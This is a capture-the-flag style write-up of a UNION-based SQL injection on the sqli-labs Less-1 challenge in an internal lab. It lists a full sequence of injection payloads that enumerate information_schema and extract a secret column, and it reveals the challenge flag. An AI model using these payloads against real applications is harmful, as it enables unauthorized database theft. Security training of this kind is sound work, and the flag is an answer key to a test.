# Case study: sqli-labs Less-1 UNION injection

Authorized internal-lab target:

```text
Windows web target: 192.168.156.23:80/TCP
RDP: 192.168.156.23:3389/TCP
Application: sqli-labs
Challenge: Less-1
Flag: Zuju76LsHVjnGxsFnnEK5tld
Assurance: reproducible_evidence
```

The RDP credentials and platform account are intentionally not published.
They are not required to understand or reproduce the SQL injection chain.

## Attack chain

1. Open Less-1 with a normal numeric `id`.
2. Break the query with a single quote.
3. Determine the column count with `ORDER BY`.
4. Confirm the reflected columns.
5. Enumerate `information_schema`.
6. Locate:

```text
database: challenges
table: c7zric1el1
column: secret_0PKW
```

7. Extract the value.

The recorded successful response included:

```text
Your Login name:2
Your Password:1|b0ab6c37a1585835b00609b336af59d7|Zuju76LsHVjnGxsFnnEK5tld|0
```

The last string is the verified Flag.

## Example payload structure

The historical command transcript was not preserved, so the exact URL prefix
is not presented as a recorded command. The equivalent payload structure is:

```text
id=1' ORDER BY 3 --+
id=-1' UNION SELECT 1,2,3 --+
id=-1' UNION SELECT 1,GROUP_CONCAT(schema_name),3
  FROM information_schema.schemata --+
id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3
  FROM information_schema.tables
  WHERE table_schema='challenges' --+
id=-1' UNION SELECT 1,GROUP_CONCAT(column_name),3
  FROM information_schema.columns
  WHERE table_schema='challenges'
  AND table_name='c7zric1el1' --+
id=-1' UNION SELECT 1,secret_0PKW,3
  FROM challenges.c7zric1el1 --+
```

## Evidence

The original remote-screen clipboard artifact contained the reflected database
row and exact Flag. The historical target may be offline or reassigned.
